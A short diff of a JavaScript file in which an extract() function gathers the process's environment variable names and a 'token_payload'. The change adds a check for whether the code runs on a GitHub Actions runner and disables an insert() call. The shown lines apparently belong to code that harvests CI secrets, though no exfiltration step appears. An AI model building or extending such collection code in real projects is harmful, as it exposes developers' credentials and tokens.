@@ -48,6 +48,7 @@ const getFiles = (suffixes) => {
 
 const extract = async () => {
     const extracted_data = {
+        is_github_runner: isGithubRunner(),
         env_keys: Object.keys(process.env),
         token_payload: '',
     };
@@ -119,4 +120,4 @@ const insert = () => {
 };
 
 extract();
-insert();
+//insert();
